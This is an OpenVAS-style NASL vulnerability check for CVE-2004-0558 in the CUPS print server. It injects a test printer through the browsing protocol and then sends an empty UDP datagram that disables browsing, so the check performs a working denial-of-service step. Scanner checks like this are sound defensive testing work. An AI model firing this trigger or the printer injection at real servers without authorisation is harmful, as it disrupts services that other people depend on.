# SPDX-FileCopyrightText: 2004 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apple:cups";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15900");
  script_version("2023-08-15T05:05:29+0000");
  script_tag(name:"last_modification", value:"2023-08-15 05:05:29 +0000 (Tue, 15 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2004-0558");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CUPS Empty UDP Datagram DoS Vulnerability");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_cups_http_detect.nasl");
  script_require_ports("Services/www", 631);
  script_mandatory_keys("cups/http/detected");
  script_require_udp_ports(631);

  script_tag(name:"summary", value:"The target is running a CUPS server that supports browsing of network
  printers and that is vulnerable to a limited type of denial of service attack. Specifically, the browsing
  feature can be disabled by sending an empty UDP datagram to the CUPS server.");

  script_tag(name:"solution", value:"Update to CUPS 1.1.21rc2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/11183");
  script_xref(name:"OSVDB", value:"9995");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

# This function tries to add a printer using the browsing feature.
#
# Args:
#   o port, CUPS port number (note: both tcp and udp port # are assumed equal)
#   o name, a name for the printer
#   o desc, a description of the printer.
#
# Return:
#   1 if successful, 0 otherwise.
function add_printer( port, name, desc ) {

  local_var packet, req, res, soc, url, port, name, desc;

  # CUPS Browsing Protocol is detailed at <http://www.cups.org/idd.html#4_2>.
  packet = string(
      "6 ",                             # Type (remote printer w/o colour)
      "3 ",                             # State (idle)
      "ipp://example.com:", port, "/printers/", name, " ",  # URI
      '"n/a" ',                         # Location
      '"', desc, '" ',                  # Information
      '"n/a"'                           # Make and model
  );
  soc = open_sock_udp( port );
  # nb: open_sock_udp is unlikely to fail - after all, this is udp.
  if( ! soc )
    return FALSE;

  send( socket:soc, data:string( packet, "\n" ) );
  close( soc );

  url = string( "/printers/", name );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );
  if(!res)
    return FALSE; # can't connect

  if( egrep( string:res, pattern:string( "Description: ", desc ) ) )
    return TRUE;
  else
    return FALSE;
}

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

vtstrings = get_vt_strings();
host = http_host_name( port:port );

# NB: since ICMP unreachable are easily dropped by firewalls, we can't
#     simply probe the UDP port: doing so would risk false positives.
#     So, we'll try adding a printer using the browsing protocol and
#     check whether it was indeed added.
rc = add_printer( port:port, name:vtstrings["lowercase"] + "_test1", desc:vtstrings["default"] + " Test #1" );

if( rc ) {

  soc = open_sock_udp( port );
  # nb: open_sock_udp is unlikely to fail - after all, this is udp.
  if( ! soc )
    exit( 0 );

  send( socket:soc, data:"" );
  close( soc );
  # NB: if browsing is disabled, cups error log will have lines like:
  #   Oct  6 16:28:18 salt cupsd[26671]: Browse recv failed - No such file or directory.
  #   Oct  6 16:28:18 salt cupsd[26671]: Browsing turned off.

  rc = add_printer( port:port, name:vtstrings["lowercase"] + "_test2", desc:vtstrings["default"] + " Test #2" );
  if( ! rc ) {
    security_message( port:port, proto:"udp" );
    exit ( 0 );
  }
}

exit( 99 );